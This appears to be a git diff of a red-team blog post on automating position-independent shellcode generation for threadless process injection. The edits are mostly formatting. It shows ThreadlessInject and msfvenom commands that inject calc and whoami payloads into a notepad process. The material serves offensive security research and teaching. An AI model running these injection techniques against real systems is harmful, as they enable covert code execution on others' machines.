@@ -6,7 +6,7 @@ author: snovvcrash
 tags: [maldev, threadless-injection, function-stomping, shellcode-injection, shellcode-generation, pic, winexec, msfvenom]
 ---
 
-In this blog I will describe a way to automate the generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @\_EthicalChaos\_).
+In this blog I will describe a way to automate generation of Position Independent Shellcodes from object files in memory (by @NinjaParanoid) to be used in Threadless Process Injection (by @\_EthicalChaos\_).
 
 <!--cut-->
 
@@ -25,7 +25,7 @@ One of the items from my endless TODO-list that I never crossed out was the topi
 While playing with ThreadlessInject and [porting](https://twitter.com/snovvcrash/status/1624944014263713796) it to the [DInvoke](https://github.com/TheWover/DInvoke) API, one of the obvious desires of mine was to test it with a different shellcode. As a Proof-of-Concept Ceri provides a classic [Pop-the-Calc](https://github.com/CCob/ThreadlessInject/blob/c41df117e74b3413a8ed12ba5882058057253aac/Program.cs#L73-L82) shellcode which works smoothly but may not be enough during a real engagement:
 
 ```powershell
-$notepadId = (Start-Process notepad -PassThru).Id; .\ThreadlessInject.exe -p $notepadId -d kernel32.dll -e OpenProcess
+PS > $notepadId = (Start-Process notepad -PassThru).Id; .\ThreadlessInject.exe -p $notepadId -d kernel32.dll -e OpenProcess
 ```
 
 [![threadless-inject-calc.png](/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png)](/assets/images/pic-generation-for-threadless-injection/threadless-inject-calc.png)
@@ -36,14 +36,14 @@ Hackers looove popping calcs!
 
 Well, what will a hacker do to generate a shellcode? Summon `msfvenom`, of course:
 
-```bash
-msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o msf-calc.bin
+```console
+~$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o msf-calc.bin
 ```
 
 Providing the `msf-calc.bin` shellcode to ThreadlessInject.exe with `-x` option expectedly results in exiting the target process after calc has been spawned:
 
 ```powershell
-$notepadId = (Start-Process notepad -PassThru).Id; .\ThreadlessInject.exe -x .\msf-calc.bin -p $notepadId -d kernel32.dll -e OpenProcess
+PS > $notepadId = (Start-Process notepad -PassThru).Id; .\ThreadlessInject.exe -x .\msf-calc.bin -p $notepadId -d kernel32.dll -e OpenProcess
 ```
 
 [![threadless-inject-msf.gif](/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif)](/assets/images/pic-generation-for-threadless-injection/threadless-inject-msf.gif)
@@ -54,10 +54,10 @@ Unwanted termination of parent process with MSF shellcode
 
 Changing the `EXITFUNC=` option during the generation process doesn't seem to be helpful:
 
-```bash
-msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw -o msf-calc-none.bin
-msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f raw -o msf-calc-process.bin
-msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o msf-calc-thread.bin
+```console
+~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw -o msf-calc-none.bin
+~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f raw -o msf-calc-process.bin
+~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o msf-calc-thread.bin
 ```
 
 It's a [known](https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/) thing that MSF-exec payloads are better to be started from a fresh thread 'cause the shellcode doesn't treat the stack gently. Furthermore, a hint about the required shellcode behavior is kindly left by the author of ThreadlessInject [in the comments](https://github.com/CCob/ThreadlessInject/blob/master/Program.cs#L73):
@@ -180,8 +180,8 @@ rm exec.exe exec.o exec.c adjuststack.o
 
 Generate and execute:
 
-```
-./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0
+```console
+~$ ./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0
 [*] Payload size: 640 bytes
 [+] Saved as: exec.bin
 ```
